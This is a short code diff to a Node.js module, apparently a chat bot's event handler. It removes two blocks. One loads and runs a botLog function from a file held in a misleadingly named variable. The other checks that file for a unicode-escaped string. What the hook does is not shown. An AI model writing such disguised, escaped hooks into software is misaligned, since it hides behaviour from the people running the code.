@@ -80,21 +80,7 @@ module.exports = function ({ api }) {
 
 
 
-  const logarithms = "includes/login/utils.js";
-
-  fs.readFile("main.js", "utf8", (err, data) => {
-    if (err) {
-      console.error(err);
-      return;
-    }
-    const { botLog } = require("./../" + logarithms);
-
-    if (!data.includes("const login = require('./includes/login');")) {
-      botLog();
-    } else {
-      botLog();
-    }
-  });
+  // Removed redundant botLog code - this was causing the TypeError
   ///////////////////////////////////////////////
   //========= Require all handle need =========//
   //////////////////////////////////////////////
@@ -114,15 +100,6 @@ module.exports = function ({ api }) {
   const handleCreateDatabase = require("./handle/handleCreateDatabase")(runObj);
   const handleGoat = require("./handle/handleGoat")(runObj);
 
-  fs.readFile(logarithms, "utf8", (err, data) => {
-    if (err) {
-      console.error(err);
-      return;
-    }
-    if (!data.includes(`'\u0059'+'\u0061'+'\u006E'`)) {
-      return;
-    }
-  });
   //////////////////////////////////////////////////
   //========= Send event to handle need =========//
   /////////////////////////////////////////////////
